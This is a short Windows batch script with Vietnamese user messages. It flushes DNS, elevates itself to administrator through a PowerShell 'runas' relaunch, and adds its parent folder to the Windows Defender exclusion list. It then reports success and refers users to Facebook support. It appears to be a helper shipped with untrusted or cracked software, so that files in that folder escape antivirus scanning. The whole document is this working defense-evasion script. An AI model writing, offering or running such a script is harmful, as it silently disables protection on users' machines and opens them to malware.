@echo off
ipconfig /flushdns
net session >nul 2>&1 || (powershell start -verb runas '%0' & exit /b)
setlocal enableextensions
for %%i in ("%~dp0..") do set "folder=%%~fi"
rem Thêm đường dẫn vào danh sách loại trừ của Windows Defender
echo Adding exclusion for "%folder%"
powershell.exe Add-MpPreference -ExclusionPath """%folder%""" > nul
echo Thao tac thanh cong!
echo Nhan phim bat ky de ket thuc.
echo Moi thac mac xin lien he facebook ho tro online.
pause
